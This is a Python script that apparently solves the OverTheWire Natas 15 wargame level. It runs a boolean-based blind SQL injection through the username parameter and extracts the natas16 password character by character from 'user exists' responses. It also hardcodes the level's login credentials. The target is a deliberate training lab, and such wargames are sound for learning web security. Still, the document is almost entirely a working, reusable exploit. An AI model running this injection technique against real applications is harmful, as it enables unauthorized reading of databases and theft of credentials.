import requests

params = ("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
chrsets = 'wabcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password = ''

for n in range(1,33):
    for i in chrsets:
        username = "natas16 \" and ascii(substr(password,"+str(n)+",1))='"+str(ord(i))+"' #"
        #print(username)
        #continue
        res = requests.get(
            "http://natas15.natas.labs.overthewire.org/index.php",
            auth=params,
            params={
                "username":username
                }
            )
        if (b"user exists" in res.content):
            password += i
            print(password)
            break
print(password)
